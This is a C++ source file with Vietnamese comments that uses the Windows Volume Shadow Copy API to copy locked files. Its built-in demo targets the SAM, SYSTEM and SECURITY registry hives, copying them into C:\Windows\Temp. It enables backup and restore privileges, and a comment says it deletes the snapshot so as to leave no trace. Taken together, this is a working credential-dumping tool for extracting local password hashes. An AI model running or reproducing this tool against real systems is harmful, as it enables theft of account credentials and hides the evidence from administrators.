/*
 * vss_copy.cpp
 *
 * Sao chép file bị lock qua VSS File-Share Snapshot.
 * Tương đương: esentutl.exe /y /vss <src> /d <dst>
 *
 * ┌──────────────────────────────────────────────────────────────────────────┐
 * │  ROOT CAUSE của lỗi 0x80042301 (VSS_E_BAD_STATE) trước đây:             │
 * │                                                                          │
 * │  Với VSS_CTX_FILE_SHARE_BACKUP, Microsoft document quy định rõ:         │
 * │  "If requesters call PrepareForBackup or BackupComplete,                 │
 * │   an error will be returned."                                            │
 * │  → Phải BỎ HOÀN TOÀN: SetBackupState, PrepareForBackup, BackupComplete  │
 * │                                                                          │
 * │  Sequence đúng cho VSS_CTX_FILE_SHARE_BACKUP:                           │
 * │    InitializeForBackup → SetContext → StartSnapshotSet                   │
 * │    → AddToSnapshotSet → DoSnapshotSet → GetSnapshotProperties            │
 * │    → [copy file] → DeleteSnapshots → Release                            │
 * └──────────────────────────────────────────────────────────────────────────┘
 *
 * Build (x64 Native Tools Command Prompt for VS):
 *   cl /W4 /EHsc vss_copy.cpp vssapi.lib ole32.lib oleaut32.lib /link /out:vss_copy.exe
 *
 * Yêu cầu: Administrator.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <objbase.h>
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>

#include <stdio.h>
#include <string>
#include <vector>
#include <memory>

#pragma comment(lib, "vssapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

 // ════════════════════════════════════════════════════════════════════════════
 //  Helpers
 // ════════════════════════════════════════════════════════════════════════════

static void Log(const wchar_t* fmt, ...)
{
    va_list ap; va_start(ap, fmt); vwprintf(fmt, ap); va_end(ap);
    fflush(stdout);
}

[[noreturn]] static void Die(const wchar_t* msg, HRESULT hr = S_OK)
{
    if (FAILED(hr)) Log(L"[FATAL] %s  (hr=0x%08X)\n", msg, (unsigned)hr);
    else            Log(L"[FATAL] %s\n", msg);
    ExitProcess(1);
}

static bool EnablePrivilege(LPCWSTR name)
{
    HANDLE hTok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) return false;
    TOKEN_PRIVILEGES tp = {};
    bool ok = false;
    if (LookupPrivilegeValueW(nullptr, name, &tp.Privileges[0].Luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof tp, nullptr, nullptr);
        ok = (GetLastError() == ERROR_SUCCESS);
    }
    CloseHandle(hTok);
    return ok;
}

// "C:\foo\bar.txt" → "C:\"
static std::wstring VolumeRootOf(const std::wstring& fullPath)
{
    wchar_t buf[MAX_PATH + 1] = {};
    if (!GetVolumePathNameW(fullPath.c_str(), buf, MAX_PATH))
        Die(L"GetVolumePathNameW failed");
    return buf;
}

// "C:\Windows\SAM", "C:\" → "Windows\SAM"
static std::wstring RelativePath(const std::wstring& volRoot,
    const std::wstring& fullPath)
{
    if (fullPath.size() <= volRoot.size()) Die(L"Path shorter than volume root");
    return fullPath.substr(volRoot.size());
}

// Tạo thư mục cha nếu chưa có
static void EnsureParentDir(const std::wstring& filePath)
{
    auto pos = filePath.find_last_of(L"\\/");
    if (pos != std::wstring::npos)
        CreateDirectoryW(filePath.substr(0, pos).c_str(), nullptr);
}

// Copy file từ snapshot path → dst bằng backup semantics
static bool StreamCopy(const std::wstring& src, const std::wstring& dst)
{
    HANDLE hSrc = CreateFileW(src.c_str(),
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN,
        nullptr);
    if (hSrc == INVALID_HANDLE_VALUE) {
        Log(L"    Cannot open snapshot file: GLE=%u\n", GetLastError());
        return false;
    }

    EnsureParentDir(dst);

    HANDLE hDst = CreateFileW(dst.c_str(),
        GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hDst == INVALID_HANDLE_VALUE) {
        Log(L"    Cannot create destination: GLE=%u\n", GetLastError());
        CloseHandle(hSrc); return false;
    }

    const DWORD BUF = 1 << 20;
    auto buf = std::make_unique<BYTE[]>(BUF);
    DWORD rd, wr; bool ok = true;
    while (ReadFile(hSrc, buf.get(), BUF, &rd, nullptr) && rd) {
        if (!WriteFile(hDst, buf.get(), rd, &wr, nullptr) || wr != rd)
        {
            ok = false; break;
        }
    }
    CloseHandle(hSrc); CloseHandle(hDst);
    if (!ok) DeleteFileW(dst.c_str());
    return ok;
}

// ════════════════════════════════════════════════════════════════════════════
//  Core: 1 IVssBackupComponents mới per file
//        KHÔNG gọi SetBackupState / PrepareForBackup / BackupComplete
//        vì VSS_CTX_FILE_SHARE_BACKUP cấm các lệnh đó
// ════════════════════════════════════════════════════════════════════════════

static bool VssCopyOneFile(const std::wstring& srcFull,
    const std::wstring& dstFull)
{
    std::wstring volRoot = VolumeRootOf(srcFull);
    std::wstring relPath = RelativePath(volRoot, srcFull);

    Log(L"\n  src : %s\n", srcFull.c_str());
    Log(L"  vol : %s\n", volRoot.c_str());
    Log(L"  dst : %s\n", dstFull.c_str());

    // ── 1. Tạo instance mới ──────────────────────────────────────────────────
    IVssBackupComponents* pVss = nullptr;
    HRESULT hr = CreateVssBackupComponents(&pVss);
    if (FAILED(hr)) { Log(L"  CreateVssBackupComponents: 0x%08X\n", (unsigned)hr); return false; }

    hr = pVss->InitializeForBackup();
    if (FAILED(hr)) {
        Log(L"  InitializeForBackup: 0x%08X\n", (unsigned)hr);
        pVss->Release(); return false;
    }

    // ── 2. SetContext = FILE_SHARE_BACKUP ────────────────────────────────────
    // Với context này:
    //   • KHÔNG gọi SetBackupState       ← error nếu gọi
    //   • KHÔNG gọi PrepareForBackup     ← VSS_E_BAD_STATE nếu gọi
    //   • KHÔNG gọi BackupComplete       ← error nếu gọi
    //   • GatherWriterMetadata: optional, không bắt buộc
    hr = pVss->SetContext(VSS_CTX_FILE_SHARE_BACKUP);
    if (FAILED(hr)) {
        Log(L"  SetContext(FILE_SHARE_BACKUP): 0x%08X\n", (unsigned)hr);
        pVss->Release(); return false;
    }

    // ── 3. StartSnapshotSet ──────────────────────────────────────────────────
    VSS_ID snapSetId = GUID_NULL;
    hr = pVss->StartSnapshotSet(&snapSetId);
    if (FAILED(hr)) {
        Log(L"  StartSnapshotSet: 0x%08X\n", (unsigned)hr);
        pVss->Release(); return false;
    }

    // ── 4. AddToSnapshotSet ──────────────────────────────────────────────────
    VSS_ID snapId = GUID_NULL;
    hr = pVss->AddToSnapshotSet((VSS_PWSZ)volRoot.c_str(), GUID_NULL, &snapId);
    if (FAILED(hr)) {
        Log(L"  AddToSnapshotSet: 0x%08X\n", (unsigned)hr);
        pVss->Release(); return false;
    }

    // ── 5. DoSnapshotSet ────────────────────────────────────────────────────
    // Với FILE_SHARE_BACKUP: bỏ qua PrepareForBackup, gọi thẳng DoSnapshotSet
    {
        IVssAsync* pA = nullptr;
        hr = pVss->DoSnapshotSet(&pA);
        if (FAILED(hr)) {
            Log(L"  DoSnapshotSet: 0x%08X\n", (unsigned)hr);
            pVss->Release(); return false;
        }
        hr = pA->Wait();
        HRESULT hrResult = S_OK;
        pA->QueryStatus(&hrResult, nullptr);
        pA->Release();
        if (FAILED(hr) || FAILED(hrResult)) {
            Log(L"  DoSnapshotSet Wait: hr=0x%08X result=0x%08X\n",
                (unsigned)hr, (unsigned)hrResult);
            pVss->Release(); return false;
        }
    }
    Log(L"  [+] Snapshot created\n");

    // ── 6. GetSnapshotProperties ─────────────────────────────────────────────
    VSS_SNAPSHOT_PROP prop = {};
    hr = pVss->GetSnapshotProperties(snapId, &prop);
    bool result = false;
    if (FAILED(hr)) {
        Log(L"  GetSnapshotProperties: 0x%08X\n", (unsigned)hr);
    }
    else {
        std::wstring snapDev(prop.m_pwszSnapshotDeviceObject);
        VssFreeSnapshotProperties(&prop);
        Log(L"  [+] Device: %s\n", snapDev.c_str());

        // ── 7. Copy file ─────────────────────────────────────────────────────
        std::wstring snapFilePath = snapDev + L"\\" + relPath;
        result = StreamCopy(snapFilePath, dstFull);
        Log(result ? L"  [+] Copied OK\n" : L"  [-] Copy FAILED\n");
    }

    // ── 8. Xóa snapshot ngay — không để lại trace ────────────────────────────
    LONG nDel = 0; VSS_ID badId = GUID_NULL;
    hr = pVss->DeleteSnapshots(snapSetId, VSS_OBJECT_SNAPSHOT_SET,
        TRUE, &nDel, &badId);
    if (SUCCEEDED(hr)) Log(L"  [+] Snapshot deleted\n");
    else               Log(L"  [!] DeleteSnapshots: 0x%08X\n", (unsigned)hr);

    // Release — KHÔNG gọi BackupComplete (cấm với FILE_SHARE_BACKUP)
    pVss->Release();
    return result;
}

// ════════════════════════════════════════════════════════════════════════════
//  main
// ════════════════════════════════════════════════════════════════════════════

struct Job { std::wstring src, dst; };

int wmain(int argc, wchar_t* argv[])
{
    std::vector<Job> jobs;
    if (argc >= 3 && argc % 2 == 1) {
        for (int i = 1; i < argc; i += 2)
            jobs.push_back({ argv[i], argv[i + 1] });
    }
    else {
        Log(L"Usage : vss_copy.exe <src1> <dst1> [<src2> <dst2> ...]\n");
        Log(L"Needs : Administrator\n\n");
        Log(L"Demo:\n");
        jobs = {
            { L"C:\\Windows\\System32\\config\\SAM",
              L"C:\\Windows\\Temp\\SAM"      },
            { L"C:\\Windows\\System32\\config\\SYSTEM",
              L"C:\\Windows\\Temp\\SYSTEM"   },
            { L"C:\\Windows\\System32\\config\\SECURITY",
              L"C:\\Windows\\Temp\\SECURITY" },
        };
    }

    // Privileges
    EnablePrivilege(SE_BACKUP_NAME);
    EnablePrivilege(SE_SECURITY_NAME);
    EnablePrivilege(SE_RESTORE_NAME);

    // COM — init 1 lần, VSS instance tạo mới per-file
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr)) Die(L"CoInitializeEx", hr);

    CoInitializeSecurity(nullptr, -1, nullptr, nullptr,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IDENTIFY,
        nullptr, EOAC_NONE, nullptr);

    Log(L"════════════════════════════════════════\n");
    Log(L" VSS File Copy (esentutl /y /vss equiv)\n");
    Log(L"════════════════════════════════════════\n");

    int ok = 0;
    for (auto& j : jobs)
        if (VssCopyOneFile(j.src, j.dst)) ++ok;

    CoUninitialize();

    Log(L"\n════════════════════════════════════════\n");
    Log(L" Result: %d / %d copied.\n", ok, (int)jobs.size());
    return (ok == (int)jobs.size()) ? 0 : 1;
}